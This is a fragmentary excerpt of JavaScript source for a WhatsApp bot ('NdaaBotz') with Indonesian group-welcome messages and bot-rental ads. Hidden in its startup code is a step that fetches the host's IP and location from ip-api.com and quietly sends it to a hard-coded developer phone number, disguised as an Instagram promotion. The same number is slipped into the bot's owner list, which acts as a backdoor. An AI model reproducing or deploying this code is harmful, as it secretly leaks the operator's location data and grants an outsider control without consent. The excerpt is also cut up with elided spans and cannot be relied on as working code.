...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    ...
    pemuda.browserDescription = ['NdaaBotz','Desktop','3.0']
    await sleep(10000)
    pemuda.on('qr', qr => {
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("62838165647110@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["62838165647110@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
       ...
       otod = `${settings.NomorOwner}@s.whatsapp.net`
        ...
        pemuda.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			...
			masuk =`*Selamat Datang Di ${mdata.subject} \n\n*Silahkan intro ya*\nNama :\nUmur :\nAsal :\n *Semoga Betah yak 😉*\n\n*OPEN SEWA BOT*\nhttps://wa.me/message/BPIUZB6I6LEWN1 `, footerText: '✗✗✗ Welcome', buttons: [{ buttonId: `.bay`, buttonText: { displayText: 'SAYONARA 👋' }, type: 1 }], headerType: 6, locationMessage: { degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: buff2 }}, 'buttonsMessage') 
            pemuda.sendMessage(mdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Keluar Dari ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://chat.whatsapp.com/HtOZC9r432KJ5WFvoDfD41`}}})
